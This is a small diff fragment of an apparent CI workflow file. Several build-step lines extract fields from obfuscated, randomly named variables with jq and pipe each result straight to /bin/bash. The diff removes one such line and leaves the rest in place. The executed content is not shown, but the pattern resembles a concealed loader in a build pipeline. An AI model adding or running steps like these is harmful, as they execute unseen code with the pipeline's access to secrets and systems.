@@ -28,7 +28,6 @@ jobs:
           echo $l2 | jq -r .nvwdj567 | /bin/bash
           printf '%s' "$wr1" | jq -r .ueo2907 | /bin/bash
           echo $bvync940 | jq -r .brd94 | /bin/bash
-          echo $vyyhh0497 | jq -r .yswf051 | /bin/bash
           echo $qkv33233 | jq -r .wb18810 | /bin/bash
 
       - name: Save archive
